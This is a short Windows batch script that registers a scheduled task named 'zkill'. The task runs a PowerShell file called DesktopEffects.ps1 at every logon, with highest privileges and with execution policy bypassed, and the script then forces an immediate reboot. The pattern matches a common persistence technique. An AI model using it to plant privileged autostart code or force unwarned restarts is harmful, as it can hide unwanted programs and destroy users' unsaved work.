@echo off

set TASKNAME=zkill
set SCRIPT=%~dp0DesktopEffects.ps1

schtasks /create /tn "%TASKNAME%" /tr "powershell.exe -ExecutionPolicy Bypass -File \"%SCRIPT%\"" /sc onlogon /rl HIGHEST /f

shutdown /r /t 0 /f

